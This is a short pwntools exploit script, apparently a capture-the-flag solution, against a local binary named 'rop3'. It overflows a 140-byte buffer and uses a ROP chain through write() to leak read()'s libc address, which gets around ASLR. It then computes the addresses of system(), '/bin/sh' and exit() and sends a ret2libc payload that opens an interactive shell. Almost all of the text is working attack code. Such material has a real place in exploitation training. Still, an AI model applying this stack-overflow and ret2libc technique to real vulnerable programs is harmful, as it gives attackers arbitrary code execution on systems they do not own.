#!/usr/bin/env python
from pwn import *

buffer = "A" * 140
buffer += "\xa6\x83\x04\x08" # address of write() in GOT (not randomized)
buffer += "\x74\x84\x04\x08" # return to vunlerable_function()
buffer += "\x01\x00\x00\x00" # fd arg to write()
buffer += "\x00\xa0\x04\x08" # address of read()
buffer += "\x04\x00\x00\x00" # size arg to read()

ex = process("./rop3", shell=True)
ex.sendline(buffer)
# Leak the address of read()
# Can use this to calculate where system() is using offset
# This bypasses ASLR
read_addr = unpack(ex.recv(4))
print hex(read_addr)

system_addr = read_addr - 0x9ad60
shell_addr = read_addr + 0x85f0b
exit_addr = read_addr - 0xa7130

print "system: " + hex(system_addr)
print "/bin/sh: " + hex(shell_addr)

payload = "A" * 140
payload += pack(system_addr)
payload += pack(exit_addr)
payload += pack(shell_addr)

ex.sendline(payload)
ex.interactive()